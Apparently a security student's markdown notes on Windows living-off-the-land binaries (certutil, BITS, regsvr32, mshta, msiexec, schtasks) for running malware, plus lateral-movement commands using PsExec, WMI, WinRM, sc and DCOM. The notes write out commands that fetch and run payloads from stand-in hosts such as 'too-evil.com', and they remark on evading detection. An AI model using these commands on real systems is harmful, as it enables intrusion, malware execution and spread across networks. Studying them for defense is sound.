# Windows


## Windows tools to run malware

Windows has some tools which facilitate running malware:

**CertUtil.exe  (tool to manage certificates)**
    - can download certificate (PEM) from url
    - `certutil -urlcache -f <url> malicious1.txt` -> download
    - `certutil -decode malicious1.txt malicious.gzip` decode

**BitsTransfer (Service "Background Intelligent Transfer Service)**
    - Service to transfer data between server and client
    - via powershell download file: `Start-BitsTransfer -Source http://bad-server.tld/payload.exe -Destination %APPDATA%/o.exe`

**Msiexec (for msi)**
    - to run msi files
    - Advantages: process is msiexec and considered legitimate, payload is in msi file and usually considered clean

**regsvr32.exe (register dll's)**
    - File can be downloaded and executed. Example: `regsvr32 /u /s /i:https://too-evil.com/payload.php scrobj.dll`
        - process would be regsvr32, which is usually considered legitimate

**mshta.exe (tool to run hta scripts)**
    - HTA scripts are html like applications that can run outside the browsers
    - example: `mshta http://too-evil.com/payload.php` (process will be mshta.exe which is considered legitimate)

**schtasks (Windows task scheduler)**
    - Service "Task Scheduler"
    - is not only used to run but also to persist malware


## Windows tools for lateral movement

- Create a scheduled task (on remote system)`
    - `schtasks /create /s {IP} /tn {name} /u {user} /sc {frequency} /p {password} /st {time} /sd {date} {command}`
- Creating System services
    - `sc \\IP create Service binPath=<command>`
- PsExec
    - `psexec \\test.domain -u Domain\User -p Password ipconfig`
- WMI
    - `wmic /node:target.domain process call create "C:\Windows\System32\cmd.exe /c payload.exe"`
- Windows Remote Management (WinRM)
    - `winrs -r:EXAMPLE.lab.local -u:DOMAIN\user -p:password calc.exe`
    - `Invoke-Command -ComputerName TARGET -ScriptBlock { dir c:\ }` via powershell
- DCOM
    - DCOM is a way to execute code on a remote machine. (is less easily detected than default tools)
    - Examples see "06 Lateral Movement.pdf"
        - run a excel on another machine (and excel runs macro)
    - DCOM can also be used to start/stop services, get system info, shut down system etc.

*Remark: some of the techniques,tools can also be used for persistence or running code locally*
*Remark2: Check Double-Hop-Problem with Network logons which makes it more difficult to jump then to another host*